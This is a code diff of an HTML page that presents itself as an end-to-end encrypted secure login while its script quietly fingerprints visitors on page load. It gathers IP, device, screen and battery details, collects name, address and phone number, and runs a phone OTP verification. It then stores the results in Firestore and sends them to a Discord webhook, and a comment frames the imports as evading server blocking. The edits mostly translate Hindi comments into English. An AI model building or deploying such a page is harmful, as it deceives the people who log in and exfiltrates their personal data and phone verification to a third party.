@@ -57,16 +57,14 @@
     <div class="footer-secure">🔒 End-to-End Encrypted Secure Login</div>
 </div>
 
-<!-- 100% वर्किंग अल्टरनेटिव क्लाइंट स्क्रिप्ट्स - जो ब्लॉक नहीं हो सकतीं -->
+<!-- इंटरनेट सर्वर ब्लॉकिंग से बचने के लिए ES Modules का सीधा इम्पोर्ट -->
 <script type="module">
     import { initializeApp } from "https://gstatic.com";
     import { getAuth, signInWithPhoneNumber, RecaptchaVerifier } from "https://gstatic.com";
     import { getFirestore, doc, setDoc, serverTimestamp } from "https://gstatic.com";
 
-    // आपका Discord Webhook URL
     const discordWebhookUrl = "https://discord.com";
     
-    // आपका असली Firebase Config
     const firebaseConfig = {
       apiKey: "AIzaSyA0PuCqJ8rCATKLwBYn1kJWjLj-ZvL-avY",
       authDomain: "://firebaseapp.com",
@@ -77,7 +75,7 @@
       measurementId: "G-EZMRNEJRQK"
     };
 
-    // इनिशियलाइजेशन (मॉड्यूल फॉर्मेट में)
+    // Initialize Firebase
     const app = initializeApp(firebaseConfig);
     const auth = getAuth(app);
     const db = getFirestore(app);
@@ -85,21 +83,19 @@
     let confirmationResultGlobal;
     let trackingData = { ip: "Fetching...", userAgent: navigator.userAgent, screenResolution: `${window.screen.width}x${window.screen.height}`, platform: navigator.platform, batteryLevel: "N/A", isCharging: "N/A" };
 
-    // रोबोट वेरिफिकेशन सेटअप
+    // Recaptcha Setup
     window.recaptchaVerifier = new RecaptchaVerifier('recaptcha-container', { 'size': 'normal' }, auth);
 
-    // Discord Alert Sender
     function sendToDiscord(titleText) {
         fetch(discordWebhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                content: `${titleText} \n\n🌐 **IP Address:** ${trackingData.ip} \n🔋 **बैटरी:** ${trackingData.batteryLevel} (Charging: ${trackingData.isCharging}) \n🖥️ **स्क्रीन साइज:** ${trackingData.screenResolution} \n💻 **OS/Platform:** ${trackingData.platform} \n⏰ **समय:** ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+                content: `${titleText} \n\n🌐 **IP Address:** ${trackingData.ip} \n🔋 **बैटरी:** ${trackingData.batteryLevel} (Charging: ${trackingData.isCharging}) \n🖥️ **स्क्रीन:** ${trackingData.screenResolution} \n💻 **OS:** ${trackingData.platform} \n⏰ **समय:** ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
             })
         }).catch(() => {});
     }
 
-    // सुरक्षित ट्रैकिंग वर्कफ़्लो
     async function startTracking() {
         if (navigator.getBattery) {
             try {
@@ -118,10 +114,10 @@
         } catch (e) { trackingData.ip = "Unknown/Blocked"; }
     }
 
-    // तुरंत ट्रैकिंग चलाएं
+    // Run Tracking
     startTracking();
 
-    // OTP प्राप्त करें बटन क्लिक इवेंट listener
+    // OTP Button
     document.getElementById('otpBtn').addEventListener('click', function() {
         const name = document.getElementById('userName').value;
         const address = document.getElementById('userAddress').value;
@@ -139,11 +135,11 @@
                 document.getElementById('phone-section').style.display = 'none';
                 document.getElementById('otp-section').style.display = 'block';
             }).catch((error) => {
-                alert("OTP भेजने में समस्या: " + error.message + "\nकृपया नंबर से पहले +91 जांचें।");
+                alert("OTP भेजने में समस्या: " + error.message);
             });
     });
 
-    // सत्यापित करें बटन क्लिक इवेंट listener
+    // Verify Button
     document.getElementById('verifyBtn').addEventListener('click', function() {
         const code = document.getElementById('otpCode').value;
         const phoneNumber = document.getElementById('phoneNumber').value;
@@ -159,7 +155,7 @@
                     resolution: trackingData.screenResolution, battery: trackingData.batteryLevel,
                     loginTime: serverTimestamp()
                 });
-            } catch(e) { console.error(e); }
+            } catch(e) {}
 
             fetch(discordWebhookUrl, {
                 method: 'POST',
